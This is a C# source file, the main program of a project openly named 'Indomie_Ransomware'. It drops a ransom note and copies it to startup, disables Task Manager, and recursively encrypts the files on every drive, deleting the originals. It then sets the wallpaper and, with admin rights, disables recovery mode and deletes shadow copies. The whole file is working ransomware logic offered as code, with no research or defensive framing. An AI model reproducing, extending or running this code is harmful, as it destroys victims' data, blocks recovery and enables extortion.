using Indomie_Ransomware.Encryption;
using Indomie_Ransomware.System;
using System.Security.Cryptography;
using System.Text;

namespace Indomie_Ransomware
{
    internal class Program
    {
        static void Main(string[] args)
        {
            
            Utils.CreateMutex();
            Utils.CreateRansNote();
            Utils.CopyRansNoteToStartup();
            Utils.DisableTaskManager();
            EncryptDrives();
            Utils.SetWallpaper();
            if (Utils.IsAdmin())
            {
                Utils.DisableRecoveryMode();
                Utils.DeleteShadowCopies();
            }

        }
        public static void EncryptDrives()
        {
            foreach (var item in DriveInfo.GetDrives())
            {
                string cDrive = Path.GetPathRoot(Environment.SystemDirectory);
                if (item.ToString() == cDrive)
                {
                    string[] subDirs = Directory.GetDirectories(cDrive);
                    foreach (string subDir in subDirs)
                    {
                        try
                        {
                            var dir = new DirectoryInfo(subDir);
                            var dirName = dir.Name;
                            if (!Array.Exists(Config.unnecesaryDirs, E => E == dirName))
                            {
                                EncryptedDirectory(subDir);
                            }
                        } catch (Exception ex)
                        {
                            Console.WriteLine("EncryptDrives error: " + ex.Message);
                            continue;
                        }
                    }
                }
                else {
                    try
                    {
                        EncryptedDirectory(item.ToString());
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("EncryptDrives error: "+ex.Message);
                        continue;
                    }
                }
            }
        }
        static void EncryptedDirectory(string directory)
        {
            
            try
            {
                string[] files = Directory.GetFiles(directory);
                foreach (string file in files)
                {
                    if (FileEncryption.IsEncrypted(file) || new FileInfo(file).Extension == ".exe")
                    {
                        continue;
                    }
                    try
                    {
                        string encFilePath = file + Config.EncryptedFileExtension;
                        FileEncryption.EncryptFile(file, encFilePath);
                        File.Delete(file);
                    }
                    catch
                    {
                        continue;
                    }
                }
            } catch (Exception e)
            {
                Console.WriteLine("error acces file");
            }
            
            try
            {
                string ransNotePath = Path.Combine(directory, "README.txt");
                File.WriteAllText(ransNotePath, Config.RansomwareNote);
            } catch { }
            try
            {
                string[] subDirs = Directory.GetDirectories(directory);
                foreach (string subDir in subDirs)
                {
                    EncryptedDirectory(subDir);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error access folder" + e.Message);
            }
        }
    }
}
